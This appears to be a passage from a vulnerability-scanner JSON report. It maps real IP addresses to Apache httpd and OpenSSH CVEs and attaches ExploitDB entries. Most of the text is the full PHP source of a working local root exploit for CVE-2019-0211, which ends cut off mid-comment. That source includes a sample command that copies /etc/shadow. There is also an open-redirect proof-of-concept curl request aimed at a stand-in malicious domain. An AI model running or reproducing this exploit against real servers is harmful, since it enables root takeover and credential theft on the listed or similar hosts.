                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ]
    },
    "152.1.166.49": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.166.199": {
        "CVE-2020-7060": []
    },
    "152.1.166.213": {
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ]
    },
    "152.1.176.35": {
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ],
        "CVE-2020-1927": [],
        "CVE-2019-10098": [
            {
                "source": "CVE",
                "_id": "2019-10098",
                "description": "In Apache HTTP server 2.4.0 to 2.4.39, Redirects configured with mod_rewrite that were intended to be self-referential might be fooled by encoded newlines and redirect instead to an unexpected URL within the request URL.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2019-10098"
                ],
                "msb": []
            },
            {
                "code": "Normal URLs like http://redirect.local/test will be forwared to https://redirect.local/test. But by using newlines (CVE 2019-10098), we can redirect somewhere else (i.e. to `https://redirect.local.evilwebsite.com`):\r\n\r\n```\r\ncurl -Ik 'https://redirect.local/%0a.evilwebsite.com' --path-as-is\r\nHTTP/2 302 \r\ndate: Mon, 28 Oct 2019 03:36:58 GMT\r\ncontent-type: text/html; charset=iso-8859-1\r\nlocation: https://redirect.local.evilwebsite.com\r\n```",
                "description": "Apache Httpd mod_rewrite - Open Redirects",
                "author": "Sebastian Neef",
                "_id": 47689,
                "source": "ExploitDB",
                "platform": "multiple",
                "date": "2019-10-14T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 0
            }
        ],
        "CVE-2019-0197": [
            {
                "source": "CVE",
                "_id": "2019-0197",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.34 to 2.4.38. When HTTP/2 was enabled for a http: host or H2Upgrade was enabled for h2 on a https: host, an Upgrade request from http/1.1 to http/2 that was not the first request on a connection could lead to a misconfiguration and crash. Server that never enabled the h2 protocol or that only enabled it for https: and did not set \"H2Upgrade on\" are unaffected by this issue.",
                "osvdb": [],
                "bid": [
                    107665
                ],
                "cve": [
                    "CVE-2019-0197"
                ],
                "msb": []
            }
        ],
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ],
        "CVE-2018-1283": [
            {
                "source": "CVE",
                "_id": "2018-1283",
                "description": "In Apache httpd 2.4.0 to 2.4.29, when mod_session is configured to forward its session data to CGI applications (SessionEnv on, not the default), a remote user may influence their content by using a \"Session\" header. This comes from the \"HTTP_SESSION\" variable name used by mod_session to forward its data to CGIs, since the prefix \"HTTP_\" is also used by the Apache HTTP Server to pass HTTP header fields, per CGI specifications.",
                "osvdb": [],
                "bid": [
                    103520
                ],
                "cve": [
                    "CVE-2018-1283"
                ],
                "msb": []
            }
        ],
        "CVE-2019-0211": [
            {
                "source": "CVE",
                "_id": "2019-0211",
                "description": "In Apache HTTP Server 2.4 releases 2.4.17 to 2.4.38, with MPM event, worker or prefork, code executing in less-privileged child processes or threads (including scripts executed by an in-process scripting interpreter) could execute arbitrary code with the privileges of the parent process (usually root) by manipulating the scoreboard. Non-Unix systems are not affected.",
                "osvdb": [],
                "bid": [
                    107666
                ],
                "cve": [
                    "CVE-2019-0211"
                ],
                "msb": []
            },
            {
                "code": "<?php\r\n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation\r\n# Charles Fol\r\n# @cfreal_\r\n# 2019-04-08\r\n#\r\n# INFOS\r\n#\r\n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html\r\n#\r\n# USAGE\r\n#\r\n# 1. Upload exploit to Apache HTTP server\r\n# 2. Send request to page\r\n# 3. Await 6:25AM for logrotate to restart Apache\r\n# 4. python3.5 is now suid 0\r\n#\r\n# You can change the command that is ran as root using the cmd HTTP\r\n# parameter (GET/POST).\r\n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/\r\n#\r\n# SUCCESS RATE\r\n#\r\n# Number of successful and failed exploitations relative to of the number\r\n# of MPM workers (i.e. Apache subprocesses). YMMV.\r\n#\r\n# W  --% S   F\r\n#  5 87% 177 26 (default)\r\n#  8 89%  60  8\r\n# 10 95%  70  4\r\n#\r\n# More workers, higher success rate.\r\n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.\r\n# Generally, failure is due to all_buckets being relocated too far from its\r\n# original address.\r\n#\r\n# TESTED ON\r\n#\r\n# - Apache/2.4.25\r\n# - PHP 7.2.12\r\n# - Debian GNU/Linux 9.6\r\n#\r\n# TESTING\r\n#\r\n# $ curl http://localhost/cfreal-carpediem.php\r\n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force\r\n# $ ls -alh /usr/bin/python3.5\r\n# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5\r\n#\r\n# There are no hardcoded addresses.\r\n# - Addresses read through /proc/self/mem\r\n# - Offsets read through ELF parsing\r\n#\r\n# As usual, there are tons of comments.\r\n#\r\n\r\n\r\no('CARPE (DIEM) ~ CVE-2019-0211');\r\no('');\r\n\r\nerror_reporting(E_ALL);\r\n\r\n\r\n# Starts the exploit by triggering the UAF.\r\nfunction real()\r\n{\r\n\tglobal $y;\r\n\t$y = [new Z()];\r\n\tjson_encode([0 => &$y]);\r\n}\r\n\r\n# In order to read/write what comes after in memory, we need to UAF a string so\r\n# that we can control its size and make in-place edition.\r\n# An easy way to do that is to replace the string by a timelib_rel_time\r\n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)\r\n# properties of the DateInterval object.\r\n#\r\n# Steps:\r\n# - Create a base object (Z)\r\n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)\r\n# - Create DateInterval object ($place) meant to be unset and filled by another\r\n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this\r\n# - Unset $place: at this point, if we create a new DateInterval object, it will\r\n#   replace $place in memory\r\n# - Create a string ($holder) that fills $place's timelib_rel_time structure\r\n# - Allocate a new DateInterval object: its timelib_rel_time structure will\r\n#   end up in place of abc\r\n# - Now we can control $this->abc's zend_string structure entirely using\r\n#   y, m, d etc.\r\n# - Increase abc's size so that we can read/write memory that comes after it,\r\n#   especially the shared memory block\r\n# - Find out all_buckets' position by finding a memory region that matches the\r\n#   mutex->meth structure\r\n# - Compute the bucket index required to reach the SHM and get an arbitrary\r\n#   function call\r\n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the\r\n#   bucket\r\nclass Z implements JsonSerializable\r\n{\r\n\tpublic function jsonSerialize()\r\n\t{\r\n\t\tglobal $y, $addresses, $workers_pids;\r\n\r\n\t\t#\r\n\t\t# Setup memory\r\n\t\t#\r\n        o('Triggering UAF');\r\n\t\to('  Creating room and filling empty spaces');\r\n\r\n\t\t# Fill empty blocks to make sure our allocations will be contiguous\r\n\t\t# I: Since a lot of allocations/deallocations happen before the script\r\n\t\t# is ran, two variables instanciated at the same time might not be\r\n\t\t# contiguous: this can be a problem for a lot of reasons.\r\n\t\t# To avoid this, we instanciate several DateInterval objects. These\r\n\t\t# objects will fill a lot of potentially non-contiguous memory blocks,\r\n\t\t# ensuring we get \"fresh memory\" in upcoming allocations.\r\n\t\t$contiguous = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$contiguous[] = new DateInterval('PT1S');\r\n\r\n\t\t# Create some space for our UAF blocks not to get overwritten\r\n\t\t# I: A PHP object is a combination of a lot of structures, such as\r\n\t\t# zval, zend_object, zend_object_handlers, zend_string, etc., which are\r\n\t\t# all allocated, and freed when the object is destroyed.\r\n\t\t# After the UAF is triggered on the object, all the structures that are\r\n\t\t# used to represent it will be marked as free.\r\n\t\t# If we create other variables afterwards, those variables might be\r\n\t\t# allocated in the object's previous memory regions, which might pose\r\n\t\t# problems for the rest of the exploitation.\r\n\t\t# To avoid this, we allocate a lot of objects before the UAF, and free\r\n\t\t# them afterwards. Since PHP's heap is LIFO, when we create other vars,\r\n\t\t# they will take the place of those objects instead of the object we\r\n\t\t# are triggering the UAF on. This means our object is \"shielded\" and\r\n\t\t# we don't have to worry about breaking it.\r\n\t\t$room = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$room[] = new Z();\r\n\r\n\t\t# Build string meant to fill old DateInterval's timelib_rel_time\r\n\t\t# I: ptr2str's name is unintuitive here: we just want to allocate a\r\n\t\t# zend_string of size 78.\r\n\t\t$_protector = ptr2str(0, 78);\r\n\r\n\t\to('  Allocating $abc and $p');\r\n\r\n\t\t# Create ABC\r\n\t\t# I: This is the variable we will use to R/W memory afterwards.\r\n\t\t# After we free the Z object, we'll make sure abc is overwritten by a\r\n\t\t# timelib_rel_time structure under our control. The first 8*8 = 64 bytes\r\n\t\t# of this structure can be modified easily, meaning we can change the\r\n\t\t# size of abc. This will allow us to read/write memory after abc.\r\n\t\t$this->abc = ptr2str(0, 79);\r\n\r\n\t\t# Create $p meant to protect $this's blocks\r\n\t\t# I: Right after we trigger the UAF, we will unset $p.\r\n\t\t# This means that the timelib_rel_time structure (TRT) of this object\r\n\t\t# will be freed. We will then allocate a string ($protector) of the same\r\n\t\t# size as TRT. Since PHP's heap is LIFO, the string will take the place\r\n\t\t# of the now-freed TRT in memory.\r\n\t\t# Then, we create a new DateInterval object ($x). From the same\r\n\t\t# assumption, every structure constituting this new object will take the\r\n\t\t# place of the previous structure. Nevertheless, since TRT's memory\r\n\t\t# block has already been replaced by $protector, the new TRT will be put\r\n\t\t# in the next free blocks of the same size, which happens to be $abc\r\n\t\t# (remember, |abc| == |timelib_rel_time|).\r\n\t\t# We now have the following situation: $x is a DateInterval object whose\r\n\t\t# internal TRT structure has the same address as $abc's zend_string.\r\n\t\t$p = new DateInterval('PT1S');\r\n\r\n\t\t#\r\n\t\t# Trigger UAF\r\n\t\t#\r\n\t\t\r\n\t\to('  Unsetting both variables and setting $protector');\r\n\t\t# UAF here, $this is usable despite being freed\r\n\t\tunset($y[0]);\r\n\t\t# Protect $this's freed blocks\r\n\t\tunset($p);\r\n\r\n\t\t# Protect $p's timelib_rel_time structure\r\n\t\t$protector = \".$_protector\";\r\n\t\t# !!! This is only required for apache\r\n\t\t# Got no idea as to why there is an extra deallocation (?)\r\n\t\t$room[] = \"!$_protector\";\r\n\r\n\t\to('  Creating DateInterval object');\r\n\t\t# After this line:\r\n\t\t# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str\r\n\t\t# We can control the structure of $this->abc and therefore read/write\r\n\t\t# anything that comes after it in memory by changing its size and\r\n\t\t# making in-place edits using $this->abc[$position] = $char\r\n\t\t$x = new DateInterval('PT1S');\r\n\t\t# zend_string.refcount = 0\r\n\t\t# It will get incremented at some point, and if it is > 1,\r\n\t\t# zend_assign_to_string_offset() will try to duplicate it before making\r\n\t\t# the in-place replacement\r\n\t\t$x->y = 0x00;\r\n\t\t# zend_string.len\r\n\t\t$x->d = 0x100;\r\n\t\t# zend_string.val[0-4]\r\n\t\t$x->h = 0x13121110;\r\n\r\n\t\t# Verify UAF was successful\r\n\t\t# We modified stuff via $x; they should be visible by $this->abc, since\r\n\t\t# they are at the same memory location.\r\n\t\tif(!(\r\n\t\t\tstrlen($this->abc) === $x->d &&\r\n\t\t\t$this->abc[0] == \"\\x10\" &&\r\n\t\t\t$this->abc[1] == \"\\x11\" &&\r\n\t\t\t$this->abc[2] == \"\\x12\" &&\r\n\t\t\t$this->abc[3] == \"\\x13\"\r\n\t\t))\r\n\t\t{\r\n\t\t\to('UAF failed, exiting.');\r\n\t\t\texit();\r\n\t\t}\r\n\t\to('UAF successful.');\r\n\t\to('');\r\n\r\n\t\t# Give us some room\r\n\t\t# I: As indicated before, just unset a lot of stuff so that next allocs\r\n\t\t# don't break our fragile UAFd structure.\r\n\t\tunset($room);\r\n\r\n\t\t#\r\n\t\t# Setup the R/W primitive\r\n\t\t#\r\n\r\n\t\t# We control $abc's internal zend_string structure, therefore we can R/W\r\n\t\t# the shared memory block (SHM), but for that we need to know the\r\n\t\t# position of $abc in memory\r\n\t\t# I: We know the absolute position of the SHM, so we need to need abc's\r\n\t\t# as well, otherwise we cannot compute the offset\r\n\r\n\t\t# Assuming the allocation was contiguous, memory looks like this, with\r\n\t\t# 0x70-sized fastbins:\r\n\t\t# \t[zend_string:abc]\r\n\t\t# \t[zend_string:protector]\r\n\t\t# \t[FREE#1]\r\n\t\t# \t[FREE#2]\r\n\t\t# Therefore, the address of the 2nd free block is in the first 8 bytes\r\n\t\t# of the first block: 0x70 * 2 - 24\r\n\t\t$address = str2ptr($this->abc, 0x70 * 2 - 24);\r\n\t\t# The address we got points to FREE#2, hence we're |block| * 3 higher in\r\n\t\t# memory\r\n\t\t$address = $address - 0x70 * 3;\r\n\t\t# The beginning of the string is 24 bytes after its origin\r\n\t\t$address = $address + 24;\r\n\t\to('Address of $abc: 0x' . dechex($address));\r\n\t\to('');\r\n\r\n\t\t# Compute the size required for our string to include the whole SHM and\r\n\t\t# apache's memory region\r\n\t\t$distance = \r\n\t\t\tmax($addresses['apache'][1], $addresses['shm'][1]) -\r\n\t\t\t$address\r\n\t\t;\r\n\t\t$x->d = $distance;\r\n\r\n\t\t# We can now read/write in the whole SHM and apache's memory region.\r\n\r\n\t\t#\r\n\t\t# Find all_buckets in memory\r\n\t\t#\r\n\r\n\t\t# We are looking for a structure s.t.\r\n\t\t# |all_buckets, mutex| = 0x10\r\n\t\t# |mutex, meth| = 0x8\r\n\t\t# all_buckets is in apache's memory region\r\n\t\t# mutex is in apache's memory region\r\n\t\t# meth is in libaprR's memory region\r\n\t\t# meth's function pointers are in libaprX's memory region\r\n\t\to('Looking for all_buckets in memory');\r\n\t\t$all_buckets = 0;\r\n\r\n\t\tfor(\r\n\t\t\t$i = $addresses['apache'][0] + 0x10;\r\n\t\t\t$i < $addresses['apache'][1] - 0x08;\r\n\t\t\t$i += 8\r\n\t\t)\r\n\t\t{\r\n\t\t\t# mutex\r\n\t\t\t$mutex = $pointer = str2ptr($this->abc, $i - $address);\r\n\t\t\tif(!in($pointer, $addresses['apache']))\r\n\t\t\t\tcontinue;\r\n\r\n\r\n\t\t\t# meth\r\n\t\t\t$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);\r\n\t\t\tif(!in($pointer, $addresses['libaprR']))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\to('  [&mutex]: 0x' . dechex($i));\r\n\t\t\to('    [mutex]: 0x' . dechex($mutex));\r\n\t\t\to('      [meth]: 0x' . dechex($meth));\r\n\r\n\r\n\t\t\t# meth->*\r\n\t\t\t# flags\r\n\t\t\tif(str2ptr($this->abc, $pointer - $address) != 0)\r\n\t\t\t\tcontinue;\r\n\t\t\t# methods\r\n\t\t\tfor($j=0;$j<7;$j++)\r\n\t\t\t{\r\n\t\t\t\t$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);\r\n\t\t\t\tif(!in($m, $addresses['libaprX']))\r\n\t\t\t\t\tcontinue 2;\r\n\t\t\t\to('        [*]: 0x' . dechex($m));\r\n\t\t\t}\r\n\r\n\t\t\t$all_buckets = $i - 0x10;\r\n\t\t\to('all_buckets = 0x' . dechex($all_buckets));\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tif(!$all_buckets)\r\n\t\t{\r\n\t\t\to('Unable to find all_buckets');\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\r\n\t\t# The address of all_buckets will change when apache is gracefully\r\n\t\t# restarted. This is a problem because we need to know all_buckets's\r\n\t\t# address in order to make all_buckets[some_index] point to a memory\r\n\t\t# region we control.\r\n\r\n\t\t#\r\n\t\t# Compute potential bucket indexes and their addresses\r\n\t\t#\r\n\r\n        o('Computing potential bucket indexes and addresses');\r\n\r\n\t\t# Since we have sizeof($workers_pid) MPM workers, we can fill the rest\r\n\t\t# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),\r\n\t\t# with data we like. We keep the one at the top to store our payload.\r\n\t\t# The rest is sprayed with the address of our payload.\r\n\r\n\t\t$size_prefork_child_bucket = 24;\r\n\t\t$size_worker_score = 264;\r\n\t\t# I get strange errors if I use every \"free\" item, so I leave twice as\r\n\t\t# many items free. I'm guessing upon startup some\r\n\t\t$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);\r\n\t\t$spray_max = $addresses['shm'][1];\r\n\t\t$spray_min = $spray_max - $spray_size;\r\n\r\n\t\t$spray_middle = (int) (($spray_min + $spray_max) / 2);\r\n\t\t$bucket_index_middle = (int) (\r\n\t\t\t- ($all_buckets - $spray_middle) /\r\n\t\t\t$size_prefork_child_bucket\r\n\t\t);\r\n\r\n\t\t#\r\n\t\t# Build payload\r\n\t\t#\r\n\r\n\t\t# A worker_score structure was kept empty to put our payload in\r\n\t\t$payload_start = $spray_min - $size_worker_score;\r\n\r\n\t\t$z = ptr2str(0);\r\n\r\n    \t# Payload maxsize 264 - 112 = 152\r\n\t\t# Offset 8 cannot be 0, but other than this you can type whatever\r\n\t\t# command you want\r\n    \t$bucket = isset($_REQUEST['cmd']) ?\r\n    \t\t$_REQUEST['cmd'] :\r\n    \t\t\"chmod +s /usr/bin/python3.5\";\r\n\r\n    \tif(strlen($bucket) > $size_worker_score - 112)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Payload size is bigger than available space (' .\r\n\t\t\t\t($size_worker_score - 112) .\r\n\t\t\t\t'), exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n    \t# Align\r\n    \t$bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\");\r\n\r\n    \t# apr_proc_mutex_unix_lock_methods_t\r\n\t\t$meth = \r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t\t# child_init\r\n\t\t    ptr2str($addresses['zend_object_std_dtor'])\r\n\t\t;\r\n\r\n\t\t# The second pointer points to meth, and is used before reaching the\r\n\t\t# arbitrary function call\r\n\t\t# The third one and the last one are both used by the function call\r\n\t\t# zend_object_std_dtor(object) => ... => system(&arData[0]->val)\r\n\t\t$properties = \r\n\t\t\t# refcount\r\n\t\t\tptr2str(1) .\r\n\t\t\t# u-nTableMask meth\r\n\t\t\tptr2str($payload_start + strlen($bucket)) .\r\n\t\t\t# Bucket arData\r\n\t\t\tptr2str($payload_start) .\r\n\t\t\t# uint32_t nNumUsed;\r\n\t\t\tptr2str(1, 4) .\r\n\t\t    # uint32_t nNumOfElements;\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nTableSize\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nInternalPointer\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# zend_long nNextFreeElement\r\n\t\t\t$z .\r\n\t\t\t# dtor_func_t pDestructor\r\n\t\t\tptr2str($addresses['system'])\r\n\t\t;\r\n\r\n\t\t$payload =\r\n\t\t\t$bucket .\r\n\t\t\t$meth .\r\n\t\t\t$properties\r\n\t\t;\r\n\r\n\t\t# Write the payload\r\n\r\n\t\to('Placing payload at address 0x' . dechex($payload_start));\r\n\r\n\t\t$p = $payload_start - $address;\r\n\t\tfor(\r\n\t\t\t$i = 0;\r\n\t\t\t$i < strlen($payload);\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$p+$i] = $payload[$i];\r\n\t\t}\r\n\r\n\t\t# Fill the spray area with a pointer to properties\r\n\t\t\r\n\t\t$properties_address = $payload_start + strlen($bucket) + strlen($meth);\r\n\t\to('Spraying pointer');\r\n\t\to('  Address: 0x' . dechex($properties_address));\r\n\t\to('  From: 0x' . dechex($spray_min));\r\n\t\to('  To: 0x' . dechex($spray_max));\r\n\t\to('  Size: 0x' . dechex($spray_size));\r\n\t\to('  Covered: 0x' . dechex($spray_size * count($workers_pids)));\r\n\t\to('  Apache: 0x' . dechex(\r\n\t\t\t$addresses['apache'][1] -\r\n\t\t\t$addresses['apache'][0]\r\n\t\t));\r\n\r\n\t\t$s_properties_address = ptr2str($properties_address);\r\n\r\n\t\tfor(\r\n\t\t\t$i = $spray_min;\r\n\t\t\t$i < $spray_max;\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$i - $address] = $s_properties_address[$i % 8];\r\n\t\t}\r\n\t\to('');\r\n\r\n\t\t# Find workers PID in the SHM: it indicates the beginning of their\r\n\t\t# process_score structure. We can then change process_score.bucket to\r\n\t\t# the index we computed. When apache reboots, it will use\r\n\t\t# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex\r\n\t\t# which means we control the whole apr_proc_mutex_t structure.\r\n\t\t# This structure contains pointers to multiple functions, especially\r\n\t\t# mutex->meth->child_init(), which will be called before privileges\r\n\t\t# are dropped.\r\n\t\t# We do this for every worker PID, incrementing the bucket index so that\r\n\t\t# we cover a bigger range.\r\n\t\t\r\n\t\to('Iterating in SHM to find PIDs...');\r\n\r\n\t\t# Number of bucket indexes covered by our spray\r\n\t\t$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);\r\n\t\t# Number of bucket indexes covered by our spray and the PS structures\r\n\t\t$total_nb_buckets = $spray_nb_buckets * count($workers_pids);\r\n\t\t# First bucket index to handle\r\n\t\t$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);\r\n\r\n\t\t# Iterate over every process_score structure until we find every PID or\r\n\t\t# we reach the end of the SHM\r\n\t\tfor(\r\n\t\t\t$p = $addresses['shm'][0] + 0x20;\r\n\t\t\t$p < $addresses['shm'][1] && count($workers_pids) > 0;\r\n\t\t\t$p += 0x24\r\n\t\t)\r\n\t\t{\r\n\t\t\t$l = $p - $address;\r\n\t\t\t$current_pid = str2ptr($this->abc, $l, 4);\r\n\t\t\to('Got PID: ' . $current_pid);\r\n\t\t\t# The PID matches one of the workers\r\n\t\t\tif(in_array($current_pid, $workers_pids))\r\n\t\t\t{\r\n\t\t\t\tunset($workers_pids[$current_pid]);\r\n\t\t\t\to('  PID matches');\r\n\t\t\t\t# Update bucket address\r\n\t\t\t\t$s_bucket_index = pack('l', $bucket_index);\r\n\t\t\t\t$this->abc[$l + 0x20] = $s_bucket_index[0];\r\n\t\t\t\t$this->abc[$l + 0x21] = $s_bucket_index[1];\r\n\t\t\t\t$this->abc[$l + 0x22] = $s_bucket_index[2];\r\n\t\t\t\t$this->abc[$l + 0x23] = $s_bucket_index[3];\r\n\t\t\t\to('  Changed bucket value to ' . $bucket_index);\r\n\t\t\t\t$min = $spray_min - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\t$max = $spray_max - $size_prefork_child_bucket * $bucket_index;\r\n\t\t\t\to('  Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));\r\n\t\t\t\t# This bucket range is covered, go to the next one\r\n\t\t\t\t$bucket_index += $spray_nb_buckets;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif(count($workers_pids) > 0)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Unable to find PIDs ' .\r\n\t\t\t\timplode(', ', $workers_pids) .\r\n\t\t\t\t' in SHM, exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\t\to('EXPLOIT SUCCESSFUL.');\r\n\t\to('Await 6:25AM.');\r\n\t\t\r\n\t\treturn 0;\r\n\t}\r\n}\r\n\r\nfunction o($msg)\r\n{\r\n\t# No concatenation -> no string allocation\r\n\tprint($msg);\r\n\tprint(\"\\n\");\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$s-1;$j>=0;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$p+$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\nfunction in($i, $range)\r\n{\r\n\treturn $i >= $range[0] && $i < $range[1];\r\n}\r\n\r\n/**\r\n * Finds the offset of a symbol in a file.\r\n */\r\nfunction find_symbol($file, $symbol)\r\n{\r\n    $elf = file_get_contents($file);\r\n    $e_shoff = str2ptr($elf, 0x28);\r\n    $e_shentsize = str2ptr($elf, 0x3a, 2);\r\n    $e_shnum = str2ptr($elf, 0x3c, 2);\r\n\r\n    $dynsym_off = 0;\r\n    $dynsym_sz = 0;\r\n    $dynstr_off = 0;\r\n\r\n    for($i=0;$i<$e_shnum;$i++)\r\n    {\r\n        $offset = $e_shoff + $i * $e_shentsize;\r\n        $sh_type = str2ptr($elf, $offset + 0x04, 4);\r\n\r\n        $SHT_DYNSYM = 11;\r\n        $SHT_SYMTAB = 2;\r\n        $SHT_STRTAB = 3;\r\n\r\n        switch($sh_type)\r\n        {\r\n            case $SHT_DYNSYM:\r\n                $dynsym_off = str2ptr($elf, $offset + 0x18, 8);\r\n                $dynsym_sz = str2ptr($elf, $offset + 0x20, 8);\r\n                break;\r\n            case $SHT_STRTAB:\r\n            case $SHT_SYMTAB:\r\n                if(!$dynstr_off)\r\n                    $dynstr_off = str2ptr($elf, $offset + 0x18, 8);\r\n                break;\r\n        }\r\n\r\n    }\r\n\r\n    if(!($dynsym_off && $dynsym_sz && $dynstr_off))\r\n        exit('.');\r\n\r\n    $sizeof_Elf64_Sym = 0x18;\r\n\r\n    for($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)\r\n    {\r\n        $offset = $dynsym_off + $i * $sizeof_Elf64_Sym;\r\n        $st_name = str2ptr($elf, $offset, 4);\r\n        \r\n        if(!$st_name)\r\n            continue;\r\n        \r\n        $offset_string = $dynstr_off + $st_name;\r\n        $end = strpos($elf, \"\\x00\", $offset_string) - $offset_string;\r\n        $string = substr($elf, $offset_string, $end);\r\n\r\n        if($string == $symbol)\r\n        {\r\n            $st_value = str2ptr($elf, $offset + 0x8, 8);\r\n            return $st_value;\r\n        }\r\n    }\r\n\r\n    die('Unable to find symbol ' . $symbol);\r\n}\r\n\r\n# Obtains the addresses of the shared memory block and some functions through \r\n# /proc/self/maps\r\n# This is hacky as hell.\r\nfunction get_all_addresses()\r\n{\r\n\t$addresses = [];\r\n\t$data = file_get_contents('/proc/self/maps');\r\n\t$follows_shm = false;\r\n\r\n\tforeach(explode(\"\\n\", $data) as $line)\r\n\t{\r\n\t\tif(!isset($addresses['shm']) && strpos($line, '/dev/zero'))\r\n\t\t{\r\n            $line = explode(' ', $line)[0];\r\n            $bounds = array_map('hexdec', explode('-', $line));\r\n            if ($bounds[1] - $bounds[0] == 0x14000)\r\n            {\r\n                $addresses['shm'] = $bounds;\r\n                $follows_shm = true;\r\n            }\r\n        }\r\n\t\tif(\r\n\t\t\tpreg_match('#(/[^\\s]+libc-[0-9.]+.so[^\\s]*)#', $line, $matches) &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$offset = find_symbol($matches[1], 'system');\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$line = hexdec(explode('-', $line)[0]);\r\n\t\t\t$addresses['system'] = $line + $offset;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r-xp')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprX'] = $bounds;\r\n\t\t}\r\n\t\tif(\r\n\t\t\tstrpos($line, 'libapr-1.so') &&\r\n\t\t\tstrpos($line, 'r--p')\r\n\t\t)\r\n\t\t{\r\n\t\t\t$line = explode(' ', $line)[0];\r\n\t\t\t$bounds = array_map('hexdec', explode('-', $line));\r\n\t\t\t$addresses['libaprR'] = $bounds;\r\n\t\t}\r\n\t\t# Apache's memory block is between the SHM and ld.so\r\n\t\t# Sometimes some rwx region gets mapped; all_buckets cannot be in there\r\n\t\t# but we include it anyways for the sake of 